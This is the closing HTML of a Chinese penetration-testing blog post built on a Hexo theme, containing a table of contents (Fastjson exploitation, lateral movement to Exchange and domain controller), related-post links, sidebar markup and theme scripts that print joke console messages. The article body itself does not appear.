class="tagsPageCount">1</span></a></div></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2025/01/01/Vulnhub-Tr0ll/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E6%A9%99.jpg?_r_=573a6a07-45fe-bb29-dd0f-92ce16703993" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Vulnhub-Tr0ll</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/12/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" title="权限提升"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E7%B1%B3.jpg?_r_=e52c66a3-492b-ba73-d924-8d692670dc58" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-12-23</div><div class="title">权限提升</div></div></a></div><div><a href="/2024/12/26/Vulnhub-W1R3S-1-0-1-%E8%AF%A6%E8%BF%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%9D%E8%B7%AF/" title="Vulnhub-W1R3S 1.0.1 &amp; 详述渗透测试思路"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E7%81%B0.jpg?_r_=0a652bcf-c1f7-3dab-70f8-c39692ee4f70" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-12-26</div><div class="title">Vulnhub-W1R3S 1.0.1 &amp; 详述渗透测试思路</div></div></a></div><div><a href="/2024/12/29/%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E5%92%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/" title="主机发现和端口扫描的原理及实现"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E7%B2%89.jpg?_r_=68739c2c-2761-c36b-a931-49c9b440da9e" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-12-29</div><div class="title">主机发现和端口扫描的原理及实现</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来看我的博客~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-Introduction"><span class="toc-number">1.</span> <span class="toc-text">0x00 Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">0x01 信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-Web%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">0x02 Web渗透</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-Fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">0x03 Fastjson 反序列化漏洞利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E6%90%AD%E5%BB%BA%E4%BB%A3%E7%90%86"><span class="toc-number">5.</span> <span class="toc-text">0x04 搭建代理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F"><span class="toc-number">6.</span> <span class="toc-text">0x05 内网扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-Exchange%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">7.</span> <span class="toc-text">0x06 横向移动-Exchange邮件服务器</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-%E5%9F%9F%E6%8E%A7"><span class="toc-number">8.</span> <span class="toc-text">0x07 横向移动-域控</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-%E4%B8%AA%E4%BA%BA%E7%94%B5%E8%84%91"><span class="toc-number">9.</span> <span class="toc-text">0x08 横向移动-个人电脑</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-Conclusion"><span class="toc-number">10.</span> <span class="toc-text">0x09 Conclusion</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/01/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/" title="春秋云镜-Exchange"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E7%BB%BF.jpg?_r_=9dd3ba88-10fa-2bd5-5013-3d6f99480167" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="春秋云镜-Exchange"/></a><div class="content"><a class="title" href="/2025/01/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/" title="春秋云镜-Exchange">春秋云镜-Exchange</a><time datetime="2025-01-02T07:29:55.000Z" title="发表于 2025-01-02 15:29:55">2025-01-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/01/Vulnhub-Tr0ll/" title="Vulnhub-Tr0ll"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E6%A9%99.jpg?_r_=573a6a07-45fe-bb29-dd0f-92ce16703993" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vulnhub-Tr0ll"/></a><div class="content"><a class="title" href="/2025/01/01/Vulnhub-Tr0ll/" title="Vulnhub-Tr0ll">Vulnhub-Tr0ll</a><time datetime="2025-01-01T08:45:13.000Z" title="发表于 2025-01-01 16:45:13">2025-01-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/30/Vulnhub-Nullbyte/" title="Vulnhub-Nullbyte"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E6%A9%99.jpg?_r_=9e8de67c-de60-be2f-9752-9af783d619f3" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vulnhub-Nullbyte"/></a><div class="content"><a class="title" href="/2024/12/30/Vulnhub-Nullbyte/" title="Vulnhub-Nullbyte">Vulnhub-Nullbyte</a><time datetime="2024-12-30T05:04:45.000Z" title="发表于 2024-12-30 13:04:45">2024-12-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/29/%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E5%92%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/" title="主机发现和端口扫描的原理及实现"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E7%B2%89.jpg?_r_=68739c2c-2761-c36b-a931-49c9b440da9e" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="主机发现和端口扫描的原理及实现"/></a><div class="content"><a class="title" href="/2024/12/29/%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E5%92%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/" title="主机发现和端口扫描的原理及实现">主机发现和端口扫描的原理及实现</a><time datetime="2024-12-29T08:02:32.000Z" title="发表于 2024-12-29 16:02:32">2024-12-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/28/Vulnhub-SickOS1-1/" title="Vulnhub-SickOS1.1"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E7%BB%BF.jpg?_r_=722405b6-7313-1af3-912a-66ae286b7688" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vulnhub-SickOS1.1"/></a><div class="content"><a class="title" href="/2024/12/28/Vulnhub-SickOS1-1/" title="Vulnhub-SickOS1.1">Vulnhub-SickOS1.1</a><time datetime="2024-12-28T05:36:29.000Z" title="发表于 2024-12-28 13:36:29">2024-12-28</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By xxshh</div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">35</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">0</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><span class="sidebar-menu-item-title">标签</span></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("31/8/2024 22:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2024 By 安知鱼 V1.6.12",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 xxshh 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
